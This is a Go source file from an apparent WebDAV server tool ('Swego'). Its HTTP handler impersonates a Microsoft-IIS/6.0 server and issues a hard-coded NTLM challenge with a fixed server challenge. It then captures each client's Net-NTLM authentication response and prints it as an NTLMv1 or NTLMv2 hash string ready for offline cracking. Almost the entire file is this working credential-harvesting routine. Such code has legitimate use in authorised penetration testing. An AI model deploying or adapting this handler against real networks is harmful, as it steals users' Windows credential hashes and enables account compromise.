package webdav

import (
	"Swego/src/cmd"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"net/http"
	"strings"

	"golang.org/x/net/webdav"
)

type CustomHandler struct {
	// Prefix is the URL path prefix to strip from WebDAV resource paths.
	Prefix string
	// FileSystem is the virtual file system.
	FileSystem webdav.FileSystem
	// LockSystem is the lock management system.
	LockSystem webdav.LockSystem
	// Logger is an optional error logger. If non-nil, it will be called
	// for all HTTP requests.
	Logger func(*http.Request, error)
}

func (customHandler *CustomHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	h := webdav.Handler(*customHandler)

	// Check credential
	if cmd.WebdavNTLM {
		if r.Header.Get("authorization") == "" {
			// If the authorization header is not set we returned the status code 401

			w.Header().Add("Connection", "keep-alive")
			w.Header()["WWW-Authenticate"] = []string{"NTLM"}
			w.Header().Add("Server", "Microsoft-IIS/6.0")
			w.WriteHeader(401)

			fmt.Println("NTLM: Sending 401 Unauthorized due to lack of Authorization header.")
		} else {
			auth := strings.Split(r.Header.Get("authorization"), " ")
			process := false

			if auth[0] == "NTLM" {
				netNTLMHash, err := base64.StdEncoding.DecodeString(auth[1])
				if err != nil {
					fmt.Println("Error while decoding the hash")
					w.WriteHeader(400)
				} else {
					if netNTLMHash[8] == 3 {
						hashString := decodeNTLMHash(netNTLMHash)
						fmt.Println("Net-NTLM hash captured:")
						fmt.Println(hashString)
						process = true
						h.ServeHTTP(w, r)
						//w.WriteHeader(401)

					}
				}

			}
			if !process {
				fmt.Println("NTLM: Sending 401 Unauthorized with NTLM Challenge Response.")

				w.Header()["WWW-Authenticate"] = []string{"NTLM TlRMTVNTUAACAAAABgAGADgAAAAFAomiESIzRFVmd4gAAAAAAAAAAIAAgAA+AAAABQLODgAAAA9TAE0AQgACAAYAUwBNAEIAAQAWAFMATQBCAC0AVABPAE8ATABLAEkAVAAEABIAcwBtAGIALgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAwADMALgBzAG0AYgAuAGwAbwBjAGEAbAAFABIAcwBtAGIALgBsAG8AYwBhAGwAAAAAAA=="}
				w.WriteHeader(401)
			}
		}

	} else {
		h.ServeHTTP(w, r)
	}

}

func decodeNTLMHash(hash []byte) string {
	//fmt.Println(hash)
	LMHashLen := hash[12]
	LMHashOffset := hash[16]
	LMHash := hash[LMHashOffset : LMHashOffset+LMHashLen]
	LMHashHex := hex.EncodeToString(LMHash)
	NTHashLen := hash[20]
	NTHashOffset := hash[24]
	NTHash := hash[NTHashOffset : NTHashOffset+NTHashLen]
	NTHashHex := hex.EncodeToString(NTHash)
	UserLen := hash[36]
	UserOffset := hash[40]
	userString := string(hash[UserOffset : UserOffset+UserLen])
	if NTHashLen == byte(24) {
		//NTLMv1
		hostnameLen := hash[46]
		hostnameOffset := hash[48]
		hostnameString := string(hash[hostnameOffset : hostnameOffset+hostnameLen])
		retvalue := "[NTLMv1] " + userString + "::" + hostnameString + ":" + LMHashHex + ":" + NTHashHex + ":1122334455667788"
		return retvalue
	} else if NTHashLen > byte(24) {
		//NTLMv2
		//DomainLen := hash[28]
		//DomainOffset := hash[32]
		//DomainString := string(hash[DomainOffset : DomainOffset+DomainLen])
		hostnameLen := hash[44]
		hostnameOffset := hash[48]
		hostnameString := string(hash[hostnameOffset : hostnameOffset+hostnameLen])

		NTHash_part1 := hex.EncodeToString(NTHash[0:16])
		NTHash_part2 := hex.EncodeToString(hash[NTHashOffset+16:])
		retvalue := "[NTLMV2] " + userString + "::" + hostnameString + ":1122334455667788:" + NTHash_part1 + ":" + NTHash_part2
		return retvalue

	}
	fmt.Println("Could not parse NTLM hash")
	return ""
}
